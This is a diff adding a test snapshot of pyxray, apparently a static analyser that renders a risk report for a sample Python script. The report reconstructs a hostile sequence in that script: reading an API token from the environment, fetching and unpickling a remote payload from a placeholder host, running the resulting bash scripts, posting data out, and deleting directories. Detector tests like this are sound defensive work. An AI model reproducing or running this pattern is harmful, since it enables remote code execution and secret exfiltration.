@@ -1,0 +1,75 @@
+---
+source: crates/pyxray-render/tests/snapshots.rs
+expression: text
+---
+┌                                                                                                  ┐
+  pyxray  sketchy.py                             21 lines · 16 statements · depth 2 · cyclomatic 2
+  reads the environment → makes 2 network calls → DELETES /tmp/stage → evaluates code at runtime …
+└ risk ██████████████████  100  read it first                                    ·▸× ≈»§ ‡ ···· ¶· ┘
+┌ T E X T U R E                                                                                    ┐
+  ▂▂▂▂▂▂▂▂▂▂···▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▂▂▂▂▂▂▂▂▂····▂▂▂▂▂▄▄▄▄██████▄▄▄▄····▂▂▂▂▂▂▂▂▂▂▂▂▂▂
+               !!!!!!        !!!!!▸▸▸▸▸    !!!!!    !!!!!         ▸▸▸▸▸▸▸▸▸!!!!!    !!!!!!!!!!¶¶¶¶
+└                                                                                                  ┘
+┌ C A P A B I L I T I E S                                                                          ┐
+└                                                                                                  ┘
+┌ W H A T   I T   D O E S                                                                          ┐
+     4 ! § getenv   API_TOKEN                                ! reads a secret from the environment
+     7 ! × rmtree   /tmp/stage                    ! recursively deletes a directory; ignore_error…
+     8   ▸ mkdir    /tmp/stage
+    10 ! ≈ GET      https://example.invalid/paylo…! verify=False — TLS certificates are not check…
+    12 ! ‡ unpickle pickle.loads                                  ! unpickling runs arbitrary code
+    15 · ▸ truncate f"{STAGING}/{name}.sh"
+    16 · ▸ write    open(f"{STAGING}/{name}.sh", "w")
+    17 ! » run      f"bash {STAGING}/{name}.sh"   ! runs an external command; shell=True — the ar…
+    19 ! ≈ POST     https://example.invalid/report                   ! sends data to a remote host
+    19   § probe    os.uname
+    20 ! » run      ["rm", "-rf", STAGING]            ! runs an external command; recursive delete
+└                                                                                                  ┘
+┌ F L O W                                                                                          ┐
+     1   ├─ import os, subprocess, shutil, pickle, base64
+     2   ├─ import requests
+     4 ! ├─ TOKEN = os.environ["API_TOKEN"]                                                    env
+     5   ├─ STAGING = "/tmp/stage"
+     7 ! ├─ shutil.rmtree(STAGING, ignore_errors=True)                                      delete
+     8   ├─ os.makedirs(STAGING)                                                             write
+    10 ! ├─ resp = requests.get("https://example.invalid/payload", …2)                         net
+    11   ├─ blob = base64.b64decode(resp.content)
+    12 ! ├─ config = pickle.loads(blob)                                                       eval
+    14 ! ├─ for name, script in config["steps"]
+    15   │  ├─ with open(f"{STAGING}/{name}.sh", "w") as fh                                  write
+    16   │  │  └─ fh.write(script)                                                           write
+    17 ! │  └─ subprocess.run(f"bash {STAGING}/{name}.sh", …2)                               shell
+    19 ! ├─ requests.post("https://example.invalid/report", …1)                            net env
+  … +1 more subprocess.run(["rm", "-rf", STAGING])                                           shell
+└                                                                                                  ┘
+┌ I M P O R T S                                                                                    ┐
+    os
+    subprocess
+    shutil
+    pickle
+    base64
+└                                                                                                  ┘
+┌ V A L U E S                                                                                      ┐
+     4 TOKEN   ?        os.environ["API_TOKEN"]
+     5 STAGING str      "/tmp/stage"
+    10 resp    response requests.get("https://example.inv…", …2)
+    11 blob    ?        base64.b64decode(resp.content)
+    12 config  ?        pickle.loads(blob)
+    14 name    ?        config["steps"]
+    14 script  ?        config["steps"]
+└                                                                                                  ┘
+┌ C A L L S                                                                                        ┐
+  subprocess.run                                                                                x2
+  open
+  print
+  base64.b64decode
+  <file>.write
+  os.makedirs
+  os.uname
+  pickle.loads
+  requests.get
+  requests.post
+└                                                                                                  ┘
+┌ S H A P E                                                                                        ┐
+  21              16              2               2               0               12
+└                                                                                                  ┘
